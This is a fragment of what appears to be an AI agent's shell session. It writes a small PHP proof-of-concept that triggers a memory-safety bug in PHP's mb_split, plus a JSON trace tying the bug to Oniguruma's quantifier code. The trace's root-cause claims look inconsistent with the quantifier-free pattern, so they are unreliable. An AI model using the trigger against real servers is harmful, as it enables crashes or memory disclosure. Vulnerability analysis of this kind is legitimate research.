message:
Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.txt')
p.write_text('<?php\nmb_regex_encoding("UTF-8");\nmb_split("\\w", "\\xfc");\n?>\n')
import json
trace=[
{"step":1,"file":"ext/mbstring/tests/bug77367.phpt","function":"<global>","line":11,"var":"pattern","code":"mb_split('\\\\w', '\\xfc');","note":"The attacker supplies a UTF-8 regex and an invalid single-byte subject, forcing mb_split into the ill-formed-byte handling path."},
{"step":2,"file":"ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":null,"var":"pattern","code":"mb_split forwards the pattern to the regex compiler before attempting the split.","note":"The raw pattern is compiled through Oniguruma, so the vulnerable preprocessing logic runs before any match attempt."},
{"step":3,"file":"oniguruma/src/regcomp.c","function":"tune_tree","line":5518,"var":"NODE_QUANT","code":"case NODE_QUANT: r = tune_quant(node, reg, state, env);","note":"Compilation enters quantifier tuning for the parsed AST, which is the code region implicated by the issue."},
{"step":4,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"The compiler classifies empty-repeat behavior using memory-aware analysis, which is the root state behind the use-after-free read."},
{"step":5,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"quantifiers_memory_node_info(Node* node)","note":"The recursive classifier walks the AST and propagates the memory/empty-repeat state from the attacker-controlled pattern."},
{"step":6,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4928,"var":"BAG_MEMORY","code":"case BAG_MEMORY: return BODY_MAY_BE_EMPTY_MEM;","note":"Capture-memory nodes are treated specially, producing the empty-memory classification that the bug mishandles."},
{"step":7,"file":"ext/mbstring/php_mbregex.c","function":"mb_split execution","line":null,"var":"subject","code":"mb_split evaluates the compiled regex against the provided string after compilation succeeds.","note":"The malformed subject drives the runtime path that consumes the compiled state and can expose stale memory reads."},
{"step":8,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5470,"var":"compiled regex","code":"r = tune_tree(body, reg, state, env);","note":"The tuned regex is finalized and then used by mb_split, which is the sink expected to trigger the memory-safety failure."}
]
Path('/workspace/candidate_trace.json').write_text(json.dumps(trace, ensure_ascii=False))
PY
python3 - <<'PY'
import json
print(json.load(open('/workspace/candidate_trace.json'))[0])
PY
